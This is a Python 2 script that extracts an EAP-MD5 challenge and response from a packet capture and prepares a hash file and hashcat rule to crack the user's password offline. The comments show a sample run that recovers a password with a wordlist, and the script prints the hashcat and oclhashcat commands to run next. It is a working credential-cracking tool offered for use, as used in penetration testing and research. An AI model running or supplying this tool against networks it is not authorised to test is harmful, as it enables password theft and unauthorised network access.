#!/usr/bin/python
# A.Ramos  <aramosf @ unsec .net>     wwww.securitybydefault.com
# Sat Jan 18 17:45:17 EST 2014
#
# Based on: 
# eapmd5crack.py will crack a eap-md5 challenge response captured on the network
# By Mark Baggett & Tim Tomes (LaNMaSteR53) available for download at www.LaNMaSteR53.com
#
# Example:
#root@kali:~# python eapmd5hcgen.py test-wlan0.pcap ToPwn eap.rule
#[-] EAP authentication exchange found.
#[-] Identity (username):  SBD
#[-] Message ID:      1
#[-] Challenge:       f99996473c372bb3ab3dded37c128cdb
#[-] Needed Response: 821df8d42637472a7fe9921e19758e4d
#[+] File with hash to crack created.
#[+] File with rule created.
#[*] Now run hashcat or oclhashcat:
#
#hashcat -m 10 --quiet --hex-salt --outfile-format 7 ToPwn /usr/share/wordlists/rockyou.txt -r eap.rule |awk -F: '{ print $3}'|sed -e 's|\x01||'
#
#oclhashcat -m 10 --quiet --hex-salt --outfile-format 7 ToPwn /usr/share/wordlists/rockyou.txt -r eap.rule |awk -F: '{ print $3}'|sed -e 's|\x01||'
#   
#root@kali:~# hexdump -C eap.rule 
#00000000  5e 01                                             |^.|
#00000002
#root@kali:~# cat ToPwn 
#821df8d42637472a7fe9921e19758e4d:f99996473c372bb3ab3dded37c128cdb
#root@kali:~# hashcat -m 10 --quiet --hex-salt --outfile-format 7 ToPwn /usr/share/wordlists/rockyou.txt -r eap.rule |awk -F: '{ print $3}'|sed -e 's|\x01||'
#demo12345
#

import sys, logging, binascii
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

reqhash = {}
resphash = {}

if len(sys.argv) < 3:
  print """Syntax: python eapmd5hcgen.py <file.pcap> <file>  <file.rule>
     file.pcap: pcap file with eap-md5 handshake
     file: to be created with hash to crack
     file.rule: to be created with hashcat rules
  
  Example: 
  $ python eapmd5hcgen.py ./capture.pcap ToPwn eapmd5rule.rule
  $ hashcat --outfile-format 7 ToPwn wordlists/rockyou.txt -r eapmd5.rule
  """
  sys.exit(2)

pcapfile = sys.argv[1]
hashfile = sys.argv[2]
rulefile = sys.argv[3]

p=rdpcap(pcapfile)
eapExist = False

for packets in p:
  if packets.haslayer(EAP):
    if packets[EAP].type == 1:
      if packets[EAP].code == 2:
        identity = packets[EAP].load[0:20]
    if packets[EAP].type==4:
      reqid=packets[EAP].id
      if packets[EAP].code == 1:
        reqhash[reqid]=packets[EAP].load[1:17]
        eapExist = True
        print "[-] EAP authentication exchange found."
	print "[-] Identity (username):  " + identity
        print "[-] Message ID:           " + str(reqid)
        print "[-] Challenge:            " + reqhash[reqid].encode("hex")
      if packets[EAP].code == 2:
        resphash[reqid]=packets[EAP].load[1:17]
        print "[-] Needed Response:      " + resphash[reqid].encode("hex")

if eapExist is False:
  print "[!] No EAP-MD5 found."
  sys.exit()

fo = open(hashfile, "w")
fo.write(resphash[reqid].encode("hex")+":"+reqhash[reqid].encode("hex"))
fo.close()
print "[+] File with hash to crack created."
fo = open(rulefile, "wb")
fo.write("^")
fo.write(chr(reqid))
fo.close()
print "[+] File with rule created."
exit = """[*] Now run hashcat or oclhashcat:

hashcat -m 10 --quiet --hex-salt --outfile-format 7 %s /usr/share/wordlists/rockyou.txt -r %s |awk -F: '{ print $3}'|sed -e 's|\\x%s||'

oclhashcat -m 10 --quiet --hex-salt --outfile-format 7 %s /usr/share/wordlists/rockyou.txt -r %s |awk -F: '{ print $3}'|sed -e 's|\\x%s||'
   """
print exit % (hashfile, rulefile, str(reqid).rjust(2,'0'),hashfile, rulefile, str(reqid).rjust(2,'0'))


